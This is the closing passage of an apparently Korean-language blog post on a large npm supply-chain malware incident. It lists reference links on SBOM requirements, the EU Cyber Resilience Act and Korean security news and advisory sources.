| **SBOM 요구사항** | https://www.ntia.gov/sbom | 미국 SBOM 최소 요소 |
| **EU Cyber Resilience Act** | https://digital-strategy.ec.europa.eu/en/policies/cyber-resilience-act | EU 사이버 복원력 법 |

### 10.10 한국어 리소스

| 자료 | URL | 설명 |
|------|-----|------|
| **KISA 보안공지** | https://www.krcert.or.kr/krcert/secNoticeList.do | 한국인터넷진흥원 보안 공지 |
| **보안뉴스** | https://www.boannews.com/ | 한국 사이버 보안 뉴스 |
| **데일리시큐** | https://www.dailysecu.com/ | 한국 보안 전문 매체 |
| **네이버 D2 보안** | https://d2.naver.com/search?keyword=보안 | 네이버 기술 블로그 보안 관련 글 |

---

**마지막 업데이트**: 2025-11-15 (2025년 후속 사건 추가)

**원본 포스트**: [[긴급] npm 생태계 대규모 보안 침해: 20억 다운로드 패키지 악성코드 감염](https://twodragon.tistory.com/692)
